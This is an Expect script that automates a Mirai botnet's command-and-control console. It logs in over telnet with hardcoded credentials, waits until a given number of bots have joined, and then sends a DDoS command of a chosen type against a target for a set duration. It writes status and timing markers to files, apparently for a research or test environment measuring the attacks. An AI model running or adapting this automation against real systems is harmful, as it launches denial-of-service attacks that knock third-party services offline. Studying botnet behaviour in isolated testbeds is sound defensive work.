#!/usr/bin/expect -f
set numOfBots [lindex $argv 0]
set DDoSType [lindex $argv 1]
set targetedDDoS [lindex $argv 2]
set dur [lindex $argv 3]
set path [lindex $argv 4]
set cnc_ip [lindex $argv 5]

set ddosFinishedFile "ddosFinishedFile.txt"
set transferFinishedFile "TransferFinishedFile.txt"
set outputTime "time_4_start_DDoS.txt"
set timeout 10
set flag 0

set outputDDoSFile [open $path/$ddosFinishedFile "w+"]
puts $outputDDoSFile "False"
close $outputDDoSFile

set outputTransferFile [open $path/$transferFinishedFile "w+"]
puts $outputTransferFile "False"
close $outputTransferFile

# Connect to CNC Server
spawn telnet $cnc_ip 23
send "\r"

# Enter Username and Password
expect "пользователь: " 
send "mirai-user\r"

expect "пароль: "
send "mirai-pass\r"

expect "mirai-user@botnet#" 
send "botcount\r" 

while { $flag < 1 } {
    # puts $flag
    expect ":	$numOfBots" {
        set outputTransferFile [open $path/$transferFinishedFile "w+"]
        puts $outputTransferFile "True"
        close $outputTransferFile

        # Record time finish transfer and start to DDoS
        set DATE [exec date +%s]
        set outputTimeFile [open $path/$outputTime "w+"]
        puts $outputTimeFile $DATE
        close $outputTimeFile

        send "$DDoSType $targetedDDoS $dur\r"
	    incr flag
    }
    send "botcount\r"
}

# wait to fully finish DDoS
set sleep_time [expr $dur + 30]
sleep $sleep_time
set outputDDoSFile [open $path/$ddosFinishedFile "w+"]
puts $outputDDoSFile "True"
close $outputDDoSFile

send "exit\r"